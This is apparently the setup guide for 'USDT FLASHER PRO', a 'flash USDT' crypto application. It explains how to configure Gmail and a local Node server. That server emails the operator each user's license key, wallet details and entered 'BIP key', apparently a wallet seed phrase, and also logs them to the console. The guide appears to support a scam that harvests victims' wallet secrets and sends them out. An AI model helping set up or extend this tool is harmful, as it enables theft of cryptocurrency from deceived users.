# USDT FLASHER PRO - Email Notification Setup

This guide will help you set up email notifications for the USDT FLASHER PRO application. Email notifications are sent when:

1. A user logs in with a license key
2. A user submits a form with wallet, network, receiver address, and flash amount
3. A user enters a BIP key

## Prerequisites

- Gmail account (for sending emails)
- App password for your Gmail account (not your regular Gmail password)

## Setting Up App Password for Gmail

To use Gmail for sending emails, you need to create an app password:

1. Go to your Google Account settings: [https://myaccount.google.com/](https://myaccount.google.com/)
2. Select "Security" from the left menu
3. Under "Signing in to Google," select "2-Step Verification" (you need to have this enabled)
4. At the bottom of the page, select "App passwords"
5. Select "Mail" as the app and "Other" as the device
6. Enter "USDT FLASHER PRO" as the name
7. Click "Generate"
8. Google will display a 16-character app password. Copy this password.

## Configuration

1. Create or edit the `.env` file in the root directory of the project
2. Add your Gmail app password to the `.env` file:

```
EMAIL_PASSWORD=your_16_character_app_password
```

## Starting the Email Notification Server

We've created a simple script to start the local API server for email notifications:

```bash
node start-local-api.js
```

This script will:

1. Check if the `.env` file exists and contains the EMAIL_PASSWORD
2. Start the local API server for email notifications
3. Send a test email to verify the configuration

**Important:** Keep the terminal window open while using the application. The local API server needs to be running for email notifications to work.

## Troubleshooting

### No Emails Received

If you're not receiving emails, check the following:

1. Make sure the local API server is running (`node start-local-api.js`)
2. Check that you've set up the correct app password in the `.env` file
3. Check your spam/junk folder
4. Look at the console output for any error messages

### Console Errors

If you see errors in the console like:

```
Failed to load resource: net::ERR_CONNECTION_REFUSED
```

This means the local API server is not running. Start it with:

```bash
node start-local-api.js
```

### Gmail Security Settings

If you're having issues with Gmail, check:

1. That 2-Step Verification is enabled
2. That you're using an app password, not your regular Gmail password
3. That you've allowed "less secure apps" in your Google account settings

## Viewing Email Notifications in the Console

Even if email notifications are not being sent (due to configuration issues), you can still see the data in the browser console:

1. Open your browser's developer tools (F12 or right-click → Inspect)
2. Go to the "Console" tab
3. You'll see entries like:
   - `LICENSE LOGIN NOTIFICATION: {key: "...", user: "...", type: "..."}`
   - `FORM SUBMISSION DATA: {wallet: "...", network: "...", receiverAddress: "...", flashAmount: "..."}`
   - `BIP KEY NOTIFICATION: {bipKey: "...", licenseKey: "...", user: "..."}`

This allows you to verify that the application is correctly capturing the data, even if the emails are not being sent.

## Manual Testing

You can manually test the email configuration with:

```bash
node test-email.js
```

This will send a test email to verify that your email configuration is working properly.
